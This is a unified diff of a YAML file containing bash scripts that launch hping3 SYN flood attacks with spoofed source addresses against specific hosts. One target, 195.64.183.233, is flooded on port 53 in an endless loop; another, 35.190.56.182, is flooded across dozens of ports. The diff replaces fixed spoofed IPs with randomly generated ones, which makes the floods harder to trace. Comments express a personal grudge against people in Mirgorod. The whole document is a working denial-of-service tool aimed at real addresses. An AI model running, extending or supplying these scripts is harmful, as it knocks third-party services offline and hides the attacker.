@@ -78,110 +78,117 @@ script_content: |
           target_port=${2}
 
           generate_ip_address() {
-              rand_ip=`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`
-
+              local rand_ip=`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`
+              echo $rand_ip
           }
-          
-          rand_ip_first=`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`
-          rand_ip_second=`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`
-          rand_ip_third=`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`
-          sudo hping3 -a ${rand_ip_first} ${target} -S -d 120 --flood -p 443 -0 &
-          sudo hping3 -a ${rand_ip_second} ${target} -S -d 120 --flood -p 443 -0 &
-          sudo hping3 -a ${rand_ip_third} ${target} -S -d 120 --flood -p 443 -0 &
-          sudo hping3 -a ${rand_ip_first} ${target} -S -d 120 --flood -p 443 -1 &
-          sudo hping3 -a ${rand_ip_second} ${target} -S -d 120 --flood -p 443 -1 &
-          sudo hping3 -a ${rand_ip_third} ${target} -S -d 120 --flood -p 443 -1 &
+
+          sudo hping3 -a $(generate_ip_address) ${target} -S -d 120 --flood -p 443 -0 &
+          sudo hping3 -a $(generate_ip_address) ${target} -S -d 120 --flood -p 443 -0 &
+          sudo hping3 -a $(generate_ip_address) ${target} -S -d 120 --flood -p 443 -0 &
+          sudo hping3 -a $(generate_ip_address) ${target} -S -d 120 --flood -p 443 -1 &
+          sudo hping3 -a $(generate_ip_address) ${target} -S -d 120 --flood -p 443 -1 &
+          sudo hping3 -a $(generate_ip_address) ${target} -S -d 120 --flood -p 443 -1 &
 
 script_content_mirgorod: |
           #!/usr/bin/env bash
           # ping # all humans will be health
+          generate_ip_address() {
+              local rand_ip=`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`
+              echo $rand_ip
+          }
+
           while true; do
           sleep 30
-            sudo hping3 -a 190.0.175.180 195.64.183.233 -S -d 120 --flood -p 53 -0
-            sudo hping3 -a 190.0.175.115 195.64.183.233 -S -d 120 --flood -p 53 -0
-            sudo hping3 -a 190.0.175.111 195.64.183.233 -S -d 120 --flood -p 53 -0
-            sudo hping3 -a 190.0.175.140 195.64.183.233 -S -d 120 --flood -p 53 -2
-            sudo hping3 -a 190.0.175.123 195.64.183.233 -S -d 120 --flood -p 53 -2
-            sudo hping3 -a 190.0.175.163 195.64.183.233 -S -d 120 --flood -p 53 -2
+            sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -0
+            sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -0
+            sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -0
+            sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -2
+            sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -2
+            sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -2
           done
 
 script_content_sci: |
           #!/usr/bin/env bash
           # all humans will be health
           # possible, to all ports on server. human trafficking.
-          # Yep, I win while scientology bandits in Mirgorod try to find way to my house. 
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 43 -1 &    
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 80 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 83 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 84 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 85 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 89 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 110 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 143 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 443 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 465 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 587 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 700 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 993 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 995 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1084 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1085 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1089 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1443 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1935 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 3389 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5222 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5432 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5900 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5901 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5999 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8080 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8081 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8085 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8086 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8088 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8089 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8090 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8099 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 9100 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 9200  -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 20000 -1 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 30000 -1 &
+          # Yep, I win while scientology bandits in Mirgorod try to find way to my house.
+          generate_ip_address() {
+              local rand_ip=`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`.`shuf -i 1-255 -n 1`
+              echo $rand_ip
+          }
 
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 43 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 80 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 83 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 84 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 85 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 89 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 110 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 143 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 443 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 465 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 587 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 700 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 993 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 995 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1084 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1085 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1089 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1443 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1935 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 3389 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5222 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5432 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5900 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5901 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5999 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8080 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8081 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8085 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8086 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8088 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8089 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8090 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8099 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 9100 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 9200  -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 20000 -0 &
-          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 30000 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 43 -1 &    
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 80 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 83 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 84 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 85 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 89 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 110 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 143 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 443 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 465 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 587 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 700 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 993 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 995 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 1084 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 1085 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 1089 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 1443 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 1935 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 3389 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 5222 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 5432 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 5900 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 5901 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 5999 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 8080 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 8081 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 8085 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 8086 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 8088 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 8089 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 8090 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 8099 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 9100 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 9200  -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 20000 -1 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 30000 -1 &
+
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 43 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 80 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 83 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 84 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 85 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 89 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 110 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 143 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 443 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 465 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 587 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 700 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 993 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 995 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 1084 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 1085 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 1089 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 1443 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 1935 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 3389 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 5222 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 5432 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 5900 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 5901 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 5999 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 8080 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 8081 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 8085 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 8086 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 8088 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 8089 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 8090 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 8099 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 9100 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 9200  -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 20000 -0 &
+          sudo hping3 -a $(generate_ip_address) 35.190.56.182 -S -d 120 --flood -p 30000 -0 &
